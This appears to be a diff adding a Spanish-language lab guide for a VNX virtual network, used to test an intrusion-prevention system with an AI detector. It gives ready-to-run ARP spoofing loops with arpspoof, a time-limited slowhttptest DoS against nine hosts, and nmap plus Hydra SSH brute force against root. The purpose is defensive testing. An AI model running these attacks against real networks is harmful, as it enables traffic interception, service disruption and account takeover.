@@ -1,0 +1,81 @@
+Ejecuta todo desde la consola de `attacker` y solo contra las IPs de esta VNX. Primero confirma las interfaces:
+
+```bash
+ip -br -4 addr
+command -v arpspoof >/dev/null || (apt-get update && apt-get install -y dsniff)
+```
+
+En el escenario, normalmente `eth0` es la VLAN 10, `eth1` la 20 y `eth2` la 30. Si `ip` muestra otros nombres, sustitúyelos.
+
+### ARP spoofing
+
+Cada comando dura como máximo 8 segundos. Prueba servidores, incluidos ambos sentidos entre `server1` y `server2`:
+
+```bash
+for oct in 10 12 13 14; do
+  timeout 8s arpspoof -i eth0 -t "192.168.1.$oct" 192.168.1.11
+done
+timeout 8s arpspoof -i eth0 -t 192.168.1.11 192.168.1.10
+```
+
+Para los dos PCs de cada laboratorio:
+
+```bash
+timeout 8s arpspoof -i eth1 -t 192.168.20.11 192.168.20.12
+timeout 8s arpspoof -i eth1 -t 192.168.20.12 192.168.20.11
+
+timeout 8s arpspoof -i eth2 -t 192.168.30.11 192.168.30.12
+timeout 8s arpspoof -i eth2 -t 192.168.30.12 192.168.30.11
+```
+
+Cada comando hace que la IP indicada al final parezca estar en la MAC del atacante para el host objetivo. Al terminar, en la consola de la víctima elimina esa entrada de vecinos y vuelve a resolverla; por ejemplo: `ip neigh del 192.168.1.11 dev eth0` y luego `ping -c 1 192.168.1.11`.
+
+### DoS HTTP de baja tasa
+
+En la consola de cada host que quieras probar, inicia un servidor HTTP temporal:
+
+```bash
+python3 -m http.server 8080 --bind 0.0.0.0
+```
+
+En `attacker`, ejecuta la prueba secuencialmente contra todos los hosts:
+
+```bash
+TARGETS=(192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.14
+         192.168.20.11 192.168.20.12 192.168.30.11 192.168.30.12)
+
+for ip in "${TARGETS[@]}"; do
+  slowhttptest -c 10 -H -i 10 -r 2 -t GET \
+    -u "http://$ip:8080/" -x 24 -p 3 -l 15
+done
+```
+
+La prueba limita cada host a 10 conexiones, 2 conexiones por segundo y 15 segundos. Requiere que el servidor HTTP esté activo en cada destino; `slowhttptest` permite limitar duración, conexiones y tasa ([documentación](https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage)).
+
+### Fuerza bruta SSH
+
+Primero comprueba cuáles tienen SSH abierto:
+
+```bash
+TARGETS=(192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.14 192.168.20.11 192.168.20.12 192.168.30.11 192.168.30.12)
+printf '%s\n' "${TARGETS[@]}"
+nmap -Pn -p 22 --open "${TARGETS[@]}"
+```
+
+Si prefieres, pásale las IPs directamente:
+
+```bash
+nmap -Pn -p 22 --open 192.168.1.10 192.168.1.11 192.168.1.12 192.168.1.13 192.168.1.14 192.168.20.11 192.168.20.12 192.168.30.11 192.168.30.12
+```
+
+Luego lanza intentos secuenciales solo contra esas IPs:
+
+```bash
+for ip in "${TARGETS[@]}"; do
+  hydra -I -l root -P /root/passwords.txt -t 1 -W 1 -w 3 -f "ssh://$ip"
+done
+```
+
+Hydra necesita SSH abierto y autenticación por contraseña habilitada. El comando usa un solo hilo, espera entre conexiones y se detiene al encontrar una contraseña ([manual de Hydra](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.1)).
+
+Puedes observar el detector con `./ips_manager.sh logs-ia` en la terminal del proyecto o desde el panel de eventos. Después de una alerta, `./ips_manager.sh clean-switch` limpia las reglas de bloqueo que dejó el IPS.
